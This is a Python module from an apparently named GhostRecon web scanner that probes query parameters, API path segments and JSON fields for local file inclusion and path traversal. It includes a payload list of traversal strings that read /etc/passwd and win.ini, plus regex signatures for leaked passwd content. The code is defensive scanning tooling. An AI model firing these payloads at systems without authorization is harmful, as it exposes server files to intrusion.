"""
LFIModule — GhostRecon module.
Detects Local File Inclusion and Path Traversal vulnerabilities.
"""
import time
import urllib.parse
import re

try:
    import requests
except ImportError:
    requests = None

from modules import BaseModule


def _qjoin(endpoint: str, query_suffix: str) -> str:
    """Append a raw query suffix to an endpoint that may already have its
    own query string (recon.py seeds endpoints like /index.php?id=1 —
    blindly appending '?param=value' would double up the '?' and the
    payload would never reach the target parameter)."""
    sep = "&" if "?" in endpoint else "?"
    return f"{endpoint}{sep}{query_suffix}"


class LFIModule(BaseModule):
    NAME = "LFI / Path Traversal"

    LFI_PARAMS = [
        "file", "path", "page", "include", "doc", "folder", "template", 
        "view", "content", "cat", "dir", "action", "board", "date", 
        "detail", "download", "prefix", "inc", "locate", "show", "site", 
        "type", "val", "name"
    ]

    PAYLOADS = [
        "../../../../../../../../../../etc/passwd",
        "/etc/passwd",
        "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
        "....//....//....//....//....//etc/passwd",
        "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "C:\\Windows\\win.ini",
    ]

    SIGNATURES = [
        (r"root:x:0:0:", "Linux /etc/passwd"),
        (r"bin:x:1:1:", "Linux /etc/passwd"),
        (r"daemon:x:", "Linux /etc/passwd"),
        (r"\[extensions\]", "Windows win.ini"),
        (r"\[fonts\]", "Windows win.ini"),
        (r"; for 16-bit app support", "Windows win.ini")
    ]

    def run(self):
        self.ui.section("LFI — Local File Inclusion / Path Traversal Detection")
        if not requests:
            return
        try:
            import urllib3; urllib3.disable_warnings()
        except Exception:
            pass

        s = self._session()
        found = 0

        endpoints = [self.base_url] + self.ctx.get("endpoints", [])[:30]
        test_params = set(self.LFI_PARAMS)
        # params.py populates this as a list of (endpoint, param_name) tuples.
        for entry in self.ctx.get("discovered_params", []):
            if isinstance(entry, (tuple, list)) and len(entry) == 2:
                test_params.add(entry[1])
            elif isinstance(entry, dict):
                test_params.update(entry.get("params", {}).keys())

        for endpoint in endpoints:
            for param in test_params:
                found_here = False

                # Get baseline to avoid false positives (e.g., page naturally containing "[fonts]")
                baseline_url = _qjoin(endpoint, f"{param}=ghostrecon_baseline_test")
                try:
                    baseline_resp = s.get(baseline_url, timeout=self.timeout)
                    baseline_text = baseline_resp.text
                except Exception:
                    baseline_text = ""

                for payload in self.PAYLOADS:
                    url = _qjoin(endpoint, f"{param}={urllib.parse.quote(payload)}")
                    try:
                        resp = s.get(url, timeout=self.timeout)

                        for sig_pattern, sig_desc in self.SIGNATURES:
                            if re.search(sig_pattern, resp.text, re.IGNORECASE):
                                # Verify signature does not exist in baseline
                                if re.search(sig_pattern, baseline_text, re.IGNORECASE):
                                    continue

                                self.db.add(
                                    title=f"LFI / Path Traversal via '{param}'",
                                    severity="critical", url=endpoint, module=self.NAME,
                                    description=(
                                        f"Parameter '{param}' is vulnerable to Path Traversal/LFI. "
                                        f"Payload '{payload}' resulted in the disclosure of {sig_desc}. "
                                        "This allows an attacker to read arbitrary files on the server."
                                    ),
                                    remediation=(
                                        "Do not pass user input directly to filesystem APIs. "
                                        "Validate input against a strict whitelist of permitted files. "
                                        "Use secure APIs like os.path.realpath() to ensure the resolved "
                                        "path is within the expected directory."
                                    ),
                                    cvss="7.5",
                                    confidence="CONFIRMED",
                                    confidence_score=95,
                                    validation_steps=["file_content_matched", "baseline_compared"],
                                    evidence=[f"Payload: {payload}", f"Matched Signature: {sig_desc}"]
                                )
                                self.ui.find("critical", f"LFI via '{param}' ({sig_desc})", endpoint)
                                found += 1
                                found_here = True
                                break # One signature is enough per payload

                        # NOTE: this must only skip remaining payloads for THIS
                        # param, not for every other param/endpoint combo —
                        # `found` is a scan-wide counter, so checking it here
                        # (as the original code did) meant that after the
                        # very first hit anywhere, every subsequent param only
                        # ever got 1 of 6 payloads tried, silently gutting scan
                        # depth for the rest of the target.
                        if found_here:
                            break # Move to next param if we found a vuln here

                        time.sleep(self.delay)
                    except Exception:
                        continue
                if found > 10:
                    break
            if found > 10:
                break

        # API endpoints from an OpenAPI/Swagger spec (recon.py) — a JSON REST
        # API has no query-string surface for the loop above to find at all,
        # but a path segment like /files/{name} or a JSON body prop like
        # "filename" is exactly as exploitable.
        found += self._test_api_endpoints(s)

        if found == 0:
            self.ui.info("No LFI/Path Traversal vulnerabilities detected.")

    def _test_api_endpoints(self, s) -> int:
        found = 0
        auth_headers = self.ctx.get("auth_headers", {})

        for api_ep in self.ctx.get("api_endpoints", []):
            method = api_ep.get("method", "GET")
            headers = dict(auth_headers)
            for name, example in api_ep.get("header_params", []):
                if example:
                    headers[name] = str(example)

            # Path-segment params that look like they might reference a file
            path_params = api_ep.get("path_params", [])
            for pname, _ in path_params:
                if not any(hint in pname.lower() for hint in
                           ("file", "path", "name", "doc", "page", "id", "flag")):
                    continue

                def build_url(value):
                    u = api_ep["url"]
                    for other_pname, other_example in path_params:
                        default = str(other_example) if other_example else "1"
                        placeholder = "{" + other_pname + "}"
                        chosen = value if other_pname == pname else default
                        u = u.replace(placeholder, urllib.parse.quote(chosen, safe=""))
                    return u

                try:
                    base_resp = s.request(method, build_url("ghostrecon_baseline_test"),
                                           timeout=self.timeout, headers=headers)
                    base_text = base_resp.text
                except Exception:
                    base_text = ""

                for payload in self.PAYLOADS:
                    try:
                        resp = s.request(method, build_url(payload), timeout=self.timeout, headers=headers)
                    except Exception:
                        continue
                    if self._check_signatures(resp.text, base_text, api_ep["url"], pname, payload, path=True):
                        found += 1
                    time.sleep(self.delay)
                if found > 5:
                    return found

            # JSON body properties that look file-related
            json_props = api_ep.get("json_props", [])
            file_props = [p for p in json_props if any(
                hint in p.lower() for hint in ("file", "path", "name", "doc", "template"))]
            for prop in file_props:
                other = {p: "test" for p in json_props if p != prop}
                try:
                    baseline_resp = s.request(method, api_ep["url"], timeout=self.timeout,
                                               headers=headers, json={**other, prop: "ghostrecon_baseline_test"})
                    base_text = baseline_resp.text
                except Exception:
                    base_text = ""
                for payload in self.PAYLOADS:
                    try:
                        resp = s.request(method, api_ep["url"], timeout=self.timeout,
                                          headers=headers, json={**other, prop: payload})
                    except Exception:
                        continue
                    if self._check_signatures(resp.text, base_text, api_ep["url"], prop, payload, path=False):
                        found += 1
                    time.sleep(self.delay)
                if found > 5:
                    return found

        return found

    def _check_signatures(self, body, baseline_text, url, param, payload, path: bool) -> bool:
        for sig_pattern, sig_desc in self.SIGNATURES:
            if re.search(sig_pattern, body, re.IGNORECASE):
                if baseline_text and re.search(sig_pattern, baseline_text, re.IGNORECASE):
                    continue
                loc = "URL path segment" if path else "JSON body property"
                self.db.add(
                    title=f"LFI / Path Traversal via '{param}' ({loc})",
                    severity="critical", url=url, module=self.NAME,
                    description=(
                        f"The '{param}' {loc} is vulnerable to Path Traversal/LFI. "
                        f"Payload '{payload}' resulted in the disclosure of {sig_desc}. "
                        "This allows an attacker to read arbitrary files on the server."
                    ),
                    remediation=(
                        "Do not pass user input directly to filesystem APIs. "
                        "Validate input against a strict whitelist of permitted files. "
                        "Use secure APIs like os.path.realpath() to ensure the resolved "
                        "path is within the expected directory."
                    ),
                    cvss="7.5",
                    confidence="CONFIRMED",
                    confidence_score=95,
                    validation_steps=["file_content_matched", "baseline_compared"],
                    evidence=[f"Payload: {payload}", f"Matched Signature: {sig_desc}"],
                )
                self.ui.find("critical", f"LFI via '{param}' ({sig_desc})", url)
                return True
        return False
